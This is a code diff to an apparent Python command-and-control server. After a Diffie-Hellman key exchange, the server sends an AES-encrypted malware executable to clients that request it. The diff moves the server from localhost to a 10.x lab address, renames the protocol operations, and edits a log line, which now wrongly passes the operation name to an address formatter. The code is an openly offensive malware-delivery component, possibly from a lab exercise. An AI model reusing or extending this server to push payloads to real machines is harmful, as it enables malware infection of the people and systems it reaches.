@@ -11,7 +11,7 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 import pbkdf2
 import hashlib
 
-HOST = '127.0.0.1'  # Symbolic name, meaning all available interfaces
+HOST = '10.0.2.5'  # Symbolic name, meaning all available interfaces
 PORT = 65432  # Arbitrary non-privileged port
 MAX_BUFFER_SIZE = 4096
 DH_KEY_LENGTH = 1024
@@ -137,12 +137,12 @@ def listen_to_client(client_socket, client_address):
             except ValueError:
                 print(f"Received a null or non-integer Gx_client from {format_address(client_address)}")
                 end_request = True
-        elif operation == "ExeSend" and malware_requests < MAX_MALWARE_REQUESTS:
+        elif operation == "exeSend" and malware_requests < MAX_MALWARE_REQUESTS:
             malware_requests += 1
             malware_data, malware_hash, malware_size = prepare_malware_data(aes_key)
 
             print(f"Sending malware hash to {format_address(client_address)}")
-            response = {"Operation": "ExeHash", "Hash": malware_hash, "DataLength": malware_size}
+            response = {"Operation": "exeHash", "Hash": malware_hash, "DataLength": malware_size}
             client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
 
             progress = tqdm.tqdm(range(FILE_SIZE), f"Sending {MALWARE_PATH} to {format_address(client_address)}",
@@ -154,9 +154,10 @@ def listen_to_client(client_socket, client_address):
                 progress.update(len(data))
 
             print(f"Encrypted executable sent to {format_address(client_address)}")
-        elif operation == "EndRequest" or malware_requests >= MAX_MALWARE_REQUESTS:
+        elif operation == "endRequest" or malware_requests >= MAX_MALWARE_REQUESTS:
             if malware_requests >= MAX_MALWARE_REQUESTS:
-                print(f"Maximum amount of malware requests exceeded for {format_address(client_address)}")
+
+                print(f"Maximum amount of malware requests exceeded for {format_address(client_address)} -> operation {format_address(operation)}")
             end_request = True
         else:
             print(f"Incorrect operation request received from {format_address(client_address)}")
